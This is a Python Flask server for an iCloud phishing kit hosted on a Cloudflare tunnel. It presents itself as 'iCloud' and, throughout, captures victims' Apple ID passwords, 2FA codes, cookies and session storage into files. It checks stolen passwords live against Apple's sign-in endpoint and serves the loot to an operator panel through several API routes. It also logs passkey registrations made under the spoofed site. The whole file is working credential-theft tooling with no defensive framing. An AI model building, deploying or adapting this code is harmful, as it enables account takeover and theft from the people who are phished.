import json
import base64
import os
import logging
import requests
from pathlib import Path
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
from webauthn import generate_registration_options, verify_registration_response
from webauthn import generate_authentication_options, verify_authentication_response
from webauthn.helpers.structs import (
    AuthenticatorSelectionCriteria,
    UserVerificationRequirement,
    RegistrationCredential,
    AuthenticationCredential,
)
from webauthn.helpers.cose import COSEAlgorithmIdentifier
from datetime import datetime

app = Flask(__name__, static_folder=None)
CORS(app)

BASE_DIR = Path(__file__).parent.resolve()

registered_credentials = {}
challenge_store = {}

RP_ID = "realize-mail-consequence-listing.trycloudflare.com"
RP_NAME = "iCloud"
ORIGIN = "https://realize-mail-consequence-listing.trycloudflare.com"

def b64encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def b64decode(data):
    return base64.urlsafe_b64decode(data + '==')

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/api/webauthn/register/begin', methods=['POST'])
def register_begin():
    data = request.json
    username = data.get('username', 'user@icloud.com')

    challenge = os.urandom(32)
    challenge_store['registration'] = {
        'challenge': challenge,
        'username': username
    }

    options = generate_registration_options(
        rp_id=RP_ID,
        rp_name=RP_NAME,
        user_id=username.encode('utf-8'),
        user_name=username,
        challenge=challenge,
        authenticator_selection=AuthenticatorSelectionCriteria(
            user_verification=UserVerificationRequirement.REQUIRED
        ),
        supported_pub_key_algs=[COSEAlgorithmIdentifier.ECDSA_SHA_256],
    )

    return jsonify({
        'publicKey': {
            'rp': {'name': options.rp.name, 'id': options.rp.id},
            'user': {
                'id': b64encode(options.user.id),
                'name': options.user.name,
                'displayName': options.user.display_name,
            },
            'challenge': b64encode(options.challenge),
            'pubKeyCredParams': [{'type': p.type, 'alg': p.alg} for p in options.pub_key_cred_params],
            'timeout': options.timeout,
            'authenticatorSelection': {
                'authenticatorAttachment': options.authenticator_selection.authenticator_attachment,
                'residentKey': options.authenticator_selection.resident_key,
                'requireResidentKey': options.authenticator_selection.require_resident_key,
                'userVerification': options.authenticator_selection.user_verification,
            },
        }
    })

@app.route('/api/webauthn/register/complete', methods=['POST'])
def register_complete():
    data = request.json
    store = challenge_store.get('registration')
    if not store:
        return jsonify({'error': 'No registration in progress'}), 400

    try:
        credential = RegistrationCredential.model_validate({
            'id': data['id'],
            'rawId': data['rawId'],
            'response': {
                'clientDataJSON': data['response']['clientDataJSON'],
                'attestationObject': data['response']['attestationObject'],
            },
            'type': 'public-key',
            'transports': data.get('transports', ['internal']),
        })

        verification = verify_registration_response(
            credential=credential,
            expected_challenge=store['challenge'],
            expected_rp_id=RP_ID,
            expected_origin=ORIGIN,
        )

        credential_id = b64encode(verification.credential_id)
        registered_credentials[credential_id] = {
            'credential_id': verification.credential_id,
            'credential_public_key': verification.credential_public_key,
            'sign_count': verification.sign_count,
            'user_verified': True,
            'username': store['username'],
        }

        # Log passkey registration alongside captured passwords
        try:
            ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            creds_dir = BASE_DIR / 'creds'
            creds_dir.mkdir(exist_ok=True)
            with open(creds_dir / f'passkey_{ts}.txt', 'w') as f:
                f.write(f"{'═'*55}\n")
                f.write("PASSKEY REGISTERED\n")
                f.write(f"{'═'*55}\n")
                f.write(f"Timestamp:    {ts}\n")
                f.write(f"Apple ID:     {store['username']}\n")
                f.write(f"Credential ID: {credential_id}\n")
                f.write(f"Sign Count:   {verification.sign_count}\n")
                f.write(f"{'═'*55}\n\n")
        except Exception:
            pass

        del challenge_store['registration']
        return jsonify({'verified': True, 'credentialId': credential_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/webauthn/signin/begin', methods=['POST'])
def signin_begin():
    data = request.json
    username = data.get('username', '')

    allowed_creds = []
    for cid, cred in registered_credentials.items():
        if cred['username'] == username or not username:
            allowed_creds.append({
                'id': b64encode(cred['credential_id']),
                'type': 'public-key',
            })

    challenge = os.urandom(32)
    challenge_store['authentication'] = {
        'challenge': challenge,
        'username': username,
    }

    options = generate_authentication_options(
        rp_id=RP_ID,
        challenge=challenge,
        user_verification=UserVerificationRequirement.REQUIRED,
    )

    return jsonify({
        'publicKey': {
            'challenge': b64encode(options.challenge),
            'timeout': options.timeout,
            'rpId': options.rp_id,
            'userVerification': options.user_verification.value,
            'allowCredentials': allowed_creds,
        }
    })

@app.route('/api/webauthn/signin/complete', methods=['POST'])
def signin_complete():
    data = request.json
    store = challenge_store.get('authentication')
    if not store:
        return jsonify({'error': 'No authentication in progress'}), 400

    credential_id_b64 = data.get('id', '')
    stored = registered_credentials.get(credential_id_b64)
    if not stored:
        return jsonify({'error': 'Credential not found'}), 400

    try:
        credential = AuthenticationCredential.model_validate({
            'id': data['id'],
            'rawId': data['rawId'],
            'response': {
                'clientDataJSON': data['response']['clientDataJSON'],
                'authenticatorData': data['response']['authenticatorData'],
                'signature': data['response']['signature'],
                'userHandle': data['response'].get('userHandle'),
            },
            'type': 'public-key',
        })

        verification = verify_authentication_response(
            credential=credential,
            expected_challenge=store['challenge'],
            expected_rp_id=RP_ID,
            expected_origin=ORIGIN,
            credential_public_key=stored['credential_public_key'],
            credential_current_sign_count=stored['sign_count'],
            require_user_verification=True,
        )

        stored['sign_count'] = verification.new_sign_count
        del challenge_store['authentication']

        try:
            ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            creds_dir = BASE_DIR / 'creds'
            with open(creds_dir / f'passkey_signin_{ts}.txt', 'w') as f:
                f.write(f"{'═'*55}\n")
                f.write("PASSKEY SIGN-IN\n")
                f.write(f"{'═'*55}\n")
                f.write(f"Timestamp:    {ts}\n")
                f.write(f"Apple ID:     {stored['username']}\n")
                f.write(f"Credential ID: {credential_id_b64}\n")
                f.write(f"Sign Count:   {verification.new_sign_count}\n")
                f.write(f"{'═'*55}\n\n")
        except Exception:
            pass

        return jsonify({
            'verified': True,
            'username': stored['username'],
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/validate_creds', methods=['POST'])
def validate_creds():
    data = request.json
    appleid = data.get('appleid', '')
    password = data.get('password', '')
    
    if not appleid or not password:
        return jsonify({'valid': False, 'error': 'Missing credentials'})
    
    try:
        session = requests.Session()
        
        # Set browser headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # First get the login page to establish session and get cookies
        init_response = session.get('https://account.apple.com/sign-in/', timeout=10, headers={
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        logger.info(f"Init response status: {init_response.status_code}")

        # Now try to login with form data
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Referer': 'https://account.apple.com/sign-in/',
            'Origin': 'https://account.apple.com',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15'
        }

        data = {
            'accountName': appleid,
            'password': password,
            'rememberMe': 'false'
        }

        response = session.post(
            'https://account.apple.com/authentication/sign-in',
            data=data,
            headers=headers,
            timeout=15,
            allow_redirects=False
        )

        logger.info(f"Login response status: {response.status_code}")

        # Try to parse JSON
        try:
            result = response.json()
            logger.info(f"Apple response: {result}")
        except:
            # Not JSON - check HTML response
            logger.info(f"Non-JSON response: {response.text[:500]}")
            if response.status_code == 200:
                # Success with HTML means valid credentials but needs 2FA
                return jsonify({'valid': True, 'authType': 'needs2FA'})
            elif 'session has timed out' in response.text.lower():
                return jsonify({'valid': False, 'error': 'Session expired, try again'})
            elif 'incorrect' in response.text.lower() or 'invalid' in response.text.lower():
                return jsonify({'valid': False, 'error': 'Invalid password'})
            return jsonify({'valid': False, 'error': 'Could not verify credentials'})

        # Check for successful login based on response content
        auth_type = result.get('authType', '')
        logger.info(f"Auth type: {auth_type}, code: {result.get('code')}")

        # Valid auth types
        if auth_type in ['SA', '2FA', 'SA2FA', 'AL2FA', 'BAL2FA', 'D2FA', 'SCV', '2fa']:
            logger.info(f"Valid credentials for {appleid} - auth type: {auth_type}")
            return jsonify({'valid': True, 'authType': auth_type})

        # Check for success indicators
        if result.get('success') or result.get('authenticated'):
            return jsonify({'valid': True, 'authType': auth_type})

        # Invalid password codes
        if result.get('code') in [-2019, -2020, -1000, -1001]:
            logger.info(f"Invalid password for {appleid}")
            return jsonify({'valid': False, 'error': 'Invalid password'})

        # Try to detect from message
        if 'message' in result and ('incorrect' in result.get('message', '').lower() or 'invalid' in result.get('message', '').lower()):
            return jsonify({'valid': False, 'error': 'Invalid password'})

        # Handle 'error-accepted' - might need 2FA
        if auth_type == 'error-accepted' or result.get('requires2FA'):
            return jsonify({'valid': True, 'authType': 'needs2FA'})

        # Unknown response - treat as could be valid, let them through
        logger.info(f"Unknown auth response: {result}")
        return jsonify({'valid': True, 'authType': auth_type, 'note': 'Could not fully verify'})
            
    except requests.exceptions.Timeout:
        return jsonify({'valid': True, 'authType': 'timeout-accepted'})
    except Exception as e:
        logger.error(f"Validation error: {e}")
        # On error, let them through to avoid blocking real users
        return jsonify({'valid': True, 'authType': 'error-accepted'})

@app.route('/captures/capture.php', methods=['POST'])
def capture_creds():
    try:
        data = request.json
        appleid = data.get('appleid', '')
        password = data.get('password', '')
        timestamp = data.get('timestamp', '')
        userAgent = data.get('userAgent', '')
        
        if not appleid or not password:
            return jsonify({'status': 'error'})
        
        ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        creds_dir = BASE_DIR / 'creds'
        creds_dir.mkdir(exist_ok=True)
        
        with open(creds_dir / f'credentials_{ts}.txt', 'w') as f:
            f.write(f"{'═'*55}\n")
            f.write("CAPTURED CREDENTIALS\n")
            f.write(f"{'═'*55}\n")
            f.write(f"Timestamp:    {ts}\n")
            f.write(f"Apple ID:      {appleid}\n")
            f.write(f"Password:      {password}\n")
            f.write(f"User-Agent:    {userAgent}\n")
            f.write(f"{'═'*55}\n\n")
        
        with open(creds_dir / 'all_credentials.log', 'a') as f:
            f.write(f"[{ts}] {appleid}\n")
        
        logger.info(f"Captured credentials for {appleid}")
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Capture error: {e}")
        return jsonify({'status': 'error'}), 400

@app.route('/save_cookies', methods=['POST'])
def save_cookies():
    try:
        data = request.json
        cookies = data.get('cookies', '')
        appleid = data.get('appleid', 'unknown')
        session_storage = data.get('sessionStorage', '')
        
        ts = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        creds_dir = BASE_DIR / 'creds'
        creds_dir.mkdir(exist_ok=True)
        
        with open(creds_dir / f'cookies_{ts}.txt', 'w') as f:
            f.write(f"{'═'*55}\n")
            f.write("SESSION DATA\n")
            f.write(f"{'═'*55}\n")
            f.write(f"Timestamp:  {ts}\n")
            f.write(f"Apple ID:   {appleid}\n")
            f.write(f"{'═'*55}\n")
            f.write(f"Cookies:\n{cookies}\n")
            f.write(f"{'═'*55}\n")
            f.write(f"SessionStorage:\n{session_storage}\n")
            f.write(f"{'═'*55}\n\n")
        
        with open(creds_dir / 'all_sessions.log', 'a') as f:
            f.write(f"[{ts}] {appleid}\n")
        
        logger.info(f"Saved session data for {appleid}")
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Error saving cookies: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/api/get-creds')
def get_creds():
    try:
        creds = []
        creds_dir = BASE_DIR / 'creds'
        if creds_dir.exists():
            for f in creds_dir.glob('credentials_*.txt'):
                with open(f, 'r') as file:
                    content = file.read()
                    email = ''
                    password = ''
                    ip = ''
                    time = ''
                    for line in content.split('\n'):
                        if 'Apple ID:' in line:
                            email = line.split('Apple ID:')[1].strip()
                        elif 'Password:' in line:
                            password = line.split('Password:')[1].strip()
                        elif 'IP:' in line:
                            ip = line.split('IP:')[1].strip()
                        elif 'Timestamp:' in line:
                            time = line.split('Timestamp:')[1].strip()
                    if email:
                        creds.append({'email': email, 'password': password, 'ip': ip, 'time': time})
        return jsonify(creds)
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/get-2fa')
def get_2fa():
    try:
        codes = []
        codes_file = BASE_DIR / '2fa_log.txt'
        if codes_file.exists():
            with open(codes_file, 'r') as f:
                for line in f:
                    if '2FA Code:' in line:
                        parts = line.split('2FA Code:')
                        if len(parts) > 1:
                            code_part = parts[1].split('for')[0].strip() if 'for' in parts[1] else parts[1].strip()
                            email_part = ''
                            if 'for' in parts[1]:
                                email_part = parts[1].split('for')[1].strip()
                            codes.append({'code': code_part, 'email': email_part, 'time': line.split('[')[1].split(']')[0] if '[' in line else ''})
        return jsonify(codes)
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/get-cookies')
def get_cookies():
    try:
        cookies = []
        cookies_file = BASE_DIR / 'cookies.json'
        if cookies_file.exists():
            with open(cookies_file, 'r') as f:
                data = json.load(f)
                for name, info in data.items():
                    cookies.append({'name': name, 'value': info.get('value', ''), 'domain': info.get('domain', '')})
        return jsonify(cookies)
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/capture-2fa', methods=['POST'])
def capture_2fa():
    try:
        data = request.json
        code = data.get('code', '')
        appleid = data.get('appleid', '')
        
        log_file = BASE_DIR / '2fa_log.txt'
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(log_file, 'a') as f:
            f.write(f"[{ts}] 2FA Code: {code} for {appleid}\n")
        
        # Also save to creds folder
        creds_dir = BASE_DIR / 'creds'
        if not creds_dir.exists():
            creds_dir.mkdir(parents=True, exist_ok=True)
        
        filename = creds_dir / f"2fa_{ts.replace(':', '-').replace(' ', '_')}.txt"
        with open(filename, 'w') as f:
            f.write(f"2FA Code: {code}\nApple ID: {appleid}\nTimestamp: {ts}\n")
        
        logger.info(f"Captured 2FA code for {appleid}")
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"Error saving 2FA: {e}")
        return jsonify({'error': str(e)}), 400

@app.route('/panel')
def panel():
    return send_from_directory(BASE_DIR, 'panel.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory(BASE_DIR, path)

if __name__ == '__main__':
    print(f"Serving from {BASE_DIR}")
    print("Starting iCloud WebAuthn server on http://localhost:5001")
    app.run(host='0.0.0.0', port=5001, debug=True)
